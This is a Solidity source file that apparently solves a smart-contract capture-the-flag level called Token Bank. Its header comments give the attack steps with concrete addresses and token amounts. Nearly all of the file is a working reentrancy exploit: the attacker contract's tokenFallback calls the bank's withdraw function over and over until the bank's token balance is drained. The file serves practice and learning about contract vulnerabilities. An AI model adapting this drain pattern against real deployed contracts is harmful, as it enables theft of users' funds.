// 1 - Call withdraw(500000000000000000000000) using Remix for player address
// 2 - Deploy TokenBankChallengeAttacker.sol - 0xFaEd6f210D0593F3c32E1ca130463DAb0fe5043a
// 3 - Approve SimpleERC223Token
// approve(0xb77070bD599655570a2aE22d33c0Df76107A21AE, 500000000000000000000000)
// 4 - Transfer SimpleERC223Token to the attacker contract
// transferFrom(0xb77070bD599655570a2aE22d33c0Df76107A21AE, 0xFaEd6f210D0593F3c32E1ca130463DAb0fe5043a, 500000000000000000000000)
// 5 - Call attack function

pragma solidity ^0.4.21;

interface ITokenBankChallenge {
    function token() external returns (address);

    function balanceOf(address from) external returns (uint256);

    function isComplete() external view returns (bool);

    function withdraw(uint256 amount) external;
}

interface ISimpleERC223Token {
    function totalSupply() external returns (uint256);

    function balanceOf(address from) external returns (uint256);

    function transfer(address to, uint256 value)
        external
        returns (bool success);
}

contract TokenBankChallengeAttacker {
    ITokenBankChallenge public challenge;
    ISimpleERC223Token public token;
    uint256 public balance = 500000000000000000000000;

    function TokenBankChallengeAttacker(address _addr) public {
        challenge = ITokenBankChallenge(_addr);
        token = ISimpleERC223Token(challenge.token());
    }

    function attack() public returns (uint256) {
        token.transfer(challenge, balance);
        challenge.withdraw(balance);
    }

    function tokenFallback(
        address from,
        uint256 value,
        bytes
    ) public {
        token.balanceOf(from);
        require(msg.sender == address(token));
        uint256 challengeLeftBalance = token.balanceOf(address(challenge));
        bool keepRecursing = challengeLeftBalance > 0;
        if (keepRecursing) {
            uint256 v = value < challengeLeftBalance
                ? value
                : challengeLeftBalance;
            challenge.withdraw(v);
        }
    }

    function isComplete() public view returns (bool) {
        return challenge.isComplete();
    }
}
